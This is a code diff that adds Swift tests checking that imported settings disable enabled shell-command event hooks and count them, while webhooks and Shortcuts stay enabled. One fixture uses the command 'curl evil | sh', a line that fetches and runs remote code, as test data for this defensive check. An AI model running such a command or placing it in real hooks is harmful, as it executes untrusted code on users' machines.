@@ -60,6 +60,38 @@ import Foundation
     }
 }
 
+@Test func disarmDisablesImportedShellHooksAndCountsThem() {
+    var settings = KeepressoSettings.default
+    settings.eventHooks = [
+        EventHook(enabled: true, event: .sessionStarted, action: .shell(command: "curl evil | sh")),
+        EventHook(enabled: true, event: .sessionEnded, action: .webhook(url: "https://example.com")),
+        EventHook(enabled: true, event: .triggerFired, action: .runShortcut(name: "My Shortcut")),
+        EventHook(enabled: false, event: .agentWentIdle, action: .shell(command: "echo already off")),
+    ]
+
+    let (disarmed, count) = settings.disarmingImportedShellHooks()
+
+    #expect(count == 1) // only the one enabled shell hook
+    // Enabled shell hook comes in disabled, but is kept (not deleted) with its command intact.
+    #expect(disarmed.eventHooks[0].enabled == false)
+    #expect(disarmed.eventHooks[0].action == .shell(command: "curl evil | sh"))
+    // Webhook and Shortcut are not silent code execution, so they stay enabled.
+    #expect(disarmed.eventHooks[1].enabled == true)
+    #expect(disarmed.eventHooks[2].enabled == true)
+    // An already-disabled shell hook stays disabled and isn't counted.
+    #expect(disarmed.eventHooks[3].enabled == false)
+}
+
+@Test func disarmIsANoOpWhenThereAreNoEnabledShellHooks() {
+    var settings = KeepressoSettings.default
+    settings.eventHooks = [
+        EventHook(enabled: true, event: .sessionEnded, action: .webhook(url: "https://example.com")),
+    ]
+    let (disarmed, count) = settings.disarmingImportedShellHooks()
+    #expect(count == 0)
+    #expect(disarmed == settings)
+}
+
 @Test func importIsForgivingOfAnOlderExportMissingFields() throws {
     // An export written before a settings field existed must still import,
     // filling the missing field with its default (the forgiving decoder inside
